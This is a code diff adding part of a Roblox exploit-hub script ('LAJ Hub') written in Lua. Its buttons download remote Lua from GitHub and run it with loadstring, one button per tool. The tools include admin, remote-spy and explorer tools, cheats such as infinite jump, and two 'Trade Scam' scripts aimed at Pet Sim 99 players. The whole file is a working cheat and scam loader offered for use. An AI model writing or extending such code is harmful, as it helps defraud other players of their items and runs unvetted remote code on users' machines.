+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/deadkrails/main/infernus_direct_loader.lua"))()
+       executednotify("Infernus Direct Loader")
+   end,
+})
+
+DeadRails:CreateButton({
+   Name = "Bynner (No Key)",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/deadkrails/refs/heads/main/bynner.lua"))()
+       executednotify("Bynner Script")
+   end,
+})
+
+-- Blox Fruits Tab (Updated)
+BloxFruits:CreateButton({
+   Name = "REDz Hub",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
+       executednotify("REDz Hub")
+   end,
+})
+
+-- Pet Sim 99 Tab with the new Trade Scam (only the one you requested)
+PetSim99:CreateButton({
+   Name = "Trade Scam",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/SyntaxHubX/Trade-Scam-V2/main/scriptv2.lua"))()
+       executednotify("Trade Scam")
+   end,
+})
+
+PetSim99:CreateButton({
+   Name = "LAJ Trade Scam (Custom)",
+   Callback = function()
+       -- Load the script from GitHub
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
+       executednotify("LAJ Custom Trade Scam")
+   end,
+})
+
+-- Universal Tab
+Universal:CreateButton({
+   Name = "Infinite Yield FE",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+       executednotify("Infinite Yield")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "Dex Explorer",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/scriptlx/refs/heads/main/dex.lua"))()
+       executednotify("Dex Explorer")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "Hydroxide",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/xChaoticVoid/Hydroxide/main/beta.lua"))()
+       executednotify("Hydroxide")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "SimpleSpy",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
+       executednotify("SimpleSpy")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "CMD-X Admin",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source'))()
+       executednotify("CMD-X Admin")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "Domain X",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/shlexware/DomainX/main/source'))()
+       executednotify("Domain X")
+   end,
+})
+
+
+-- Settings Tab
+local idled_Connection
+
+local function onIdled()
+    game:GetService("VirtualUser"):CaptureController()
+    game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
+end
+
+Settings:CreateButton({
+    Name = "Anti AFK",
+    Callback = function()
+        if not idled_Connection then
+            idled_Connection = game.Players.LocalPlayer.Idled:Connect(onIdled)
+            executednotify("Anti AFK")
+        end
+    end,
+})
+
+local Inf_jump = false
+
+Settings:CreateToggle({
+   Name = "Infinite Jump",
+   CurrentValue = false,
+   Callback = function(Value)
+      Inf_jump = Value
+      game:GetService("UserInputService").JumpRequest:Connect(function()
+         if Inf_jump then
+            game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+         end
+      end)
+   end,
+})
+
+-- Credit section
+local creditSection = MainTab:CreateSection("Credits")
+
+MainTab:CreateLabel("Created by LAJ Hub Team")
+MainTab:CreateLabel("Discord: discord.gg/4mgdcfvAJU")
+MainTab:CreateLabel("Script Version: 4.1 (Swift Compatible)")
+MainTab:CreateLabel("* Optimized for Swift Executor")
+
+-- Print Swift compatibility notice
+print("LAJ HUB - Swift Compatible Version")
+print("All HTTP requests have been optimized for Swift executor")
+print("This version includes:")
+print("1. Full Swift compatibility")
+print("2. Pet Sim 99 Tab with new Trade Scam V2")
+print("3. All scripts updated to work with Swift")
+print("4. Improved executor detection")
